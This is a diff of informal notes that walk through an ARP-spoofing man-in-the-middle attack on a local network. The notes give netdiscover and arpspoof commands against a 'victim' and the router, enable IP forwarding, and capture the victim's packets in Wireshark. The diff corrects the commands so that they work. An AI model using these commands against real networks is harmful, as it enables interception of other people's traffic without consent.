@@ -6,14 +6,14 @@ first of all we tell the victim's pc that we are the router by using arpspoof
 (before that we use'sudo netdiscover' for seeing the ip addresses and the devices in the 
 local network)
 we start using the command 
-sudo arespoof -i eth0 -t 192.168.1.victim 192.168.1.1
+sudo arpspoof -i eth0 -t 192.168.1.victim 192.168.1.1
 so from now on victim's pc think that we are the router then for the connection
 between router and I we also have to do another arpsoof atck by:
 sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.victim
 now the connection between me , the victim's pc and the router is done succesfully 
 however there's only 1 problem,the connection between me and the victim won't go out
 through the internet we must enable ip forwarding by going to 
-nano /proc/sys/ipv4/ip_forward and we open the file and we only have to change the number 0 to 1
+nano /proc/sys/net/ipv4/ip_forward and we open the file and we only have to change the number 0 to 1
 now everything should work perfectly 
 the last stepp is to use a wireshark so we can capture and see the packets that
 are going out from the victim's pc 
